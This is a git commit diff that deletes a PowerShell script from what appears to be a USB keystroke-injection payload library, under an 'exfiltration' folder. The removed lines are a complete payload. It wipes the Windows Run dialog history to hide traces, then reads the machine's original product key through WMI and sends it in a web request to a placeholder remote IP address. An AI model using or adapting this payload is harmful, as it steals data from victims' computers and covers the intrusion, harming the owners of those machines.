205c861602bd5fc7db2793c479d51ae6c0b57456
Julien Morice <120029567+Who-Is-Julien@users.noreply.github.com>
2023-07-11 16:32:51 +0000

    Delete directory | Update "Windows Product Duckey"

--- payloads/library/exfiltration/Windows-Product-Duckey/source.ps1
+++
@@ -1,8 +0,0 @@
-#Replace <REMOTE_IP_ADDRESS> with the actual IP address of the remote server hosting the script.
-
-
-#Clear windows run dialog history
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
-
-#Retrieve and send the computer's original product key to a remote server
-Invoke-WebRequest -Uri "http://<REMOTE_IP_ADDRESS>?duckey=$((Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey)" -Method Get -UseBasicParsing | Out-Null
